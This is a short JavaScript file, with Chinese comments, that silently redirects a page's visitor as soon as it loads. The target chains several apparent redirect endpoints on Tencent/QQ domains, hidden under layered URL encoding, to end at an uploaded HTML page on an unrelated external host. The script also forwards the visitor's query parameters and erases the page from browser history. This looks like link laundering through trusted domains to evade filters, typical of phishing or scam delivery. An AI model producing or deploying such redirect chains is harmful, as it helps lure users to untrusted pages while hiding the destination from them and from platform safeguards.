(function smartRedirect() {
    try {
        // 创建目标URL对象（请替换实际地址）
        const target = new URL('https://docs.qq.com/scenario/link.html?_wv=1072&url=https%3A%2F%2Fyouxi.gamecenter.qq.com%2Fcomm-htdocs%2Flogin%2FloginSuccess.html%3Fs_url%3Dhttps%253A%252F%252Fdocs.qq.com%252Fscenario%252Flink.html%253Furl%253Dhttps%25253A%25252F%25252Fh5.qzone.qq.com%25252Fminiapp%25252Fact%25252FhippyJump%252523%25252F%25253Fschema%25253Dhttp%2525253A%2525252F%2525252F/one.zjzy.vip/upload/default/20250328111243FoF4R6rw.html');
        
        // 合并当前参数（智能处理重复参数）
        const params = new URLSearchParams(location.search);
        params.forEach((value, key) => {
            // 排除目标URL已有的参数（避免覆盖）
            if (!target.searchParams.has(key)) {
                target.searchParams.append(key, value);
            }
        });

        // 执行静默跳转（不保留当前页面历史记录）
        window.location.replace(target.toString());
        
    } catch (error) {
        console.error('跳转失败:', error);
        // 可在此处添加降级处理逻辑
    }
})();
